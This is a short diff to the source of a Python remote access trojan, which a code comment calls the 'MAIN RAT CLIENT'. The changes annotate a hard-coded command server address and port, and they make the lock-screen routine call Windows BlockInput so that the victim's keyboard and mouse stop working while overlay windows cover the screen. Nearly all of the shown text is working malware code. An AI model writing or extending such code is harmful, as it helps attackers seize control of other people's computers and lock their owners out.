@@ -15,7 +15,7 @@ import ctypes
 import requests
 from io import BytesIO
 
-server_ip = '192.168.1.248'
+server_ip = '192.168.1.248'  # Replace with your server IP
 server_port = 9999
 
 mouse = MouseController()
@@ -124,6 +124,13 @@ def show_lock_screen_gui():
 
         lock_overlays.append(win)
 
+    # Block physical input (Windows only)
+    if platform.system() == "Windows":
+        try:
+            ctypes.windll.user32.BlockInput(True)
+        except Exception as e:
+            print(f"[!] BlockInput failed (Admin required?): {e}")
+
 def hide_lock_screen_gui():
     """Destroy all overlay windows and allow normal VM input again."""
     global lock_overlays
@@ -133,6 +140,13 @@ def hide_lock_screen_gui():
         except:
             pass
     lock_overlays.clear()
+
+    # Unblock physical input (Windows only)
+    if platform.system() == "Windows":
+        try:
+            ctypes.windll.user32.BlockInput(False)
+        except Exception as e:
+            print(f"[!] BlockInput failed (Admin required?): {e}")
 
 # -------------------------------------------------------------------
 # MAIN RAT CLIENT
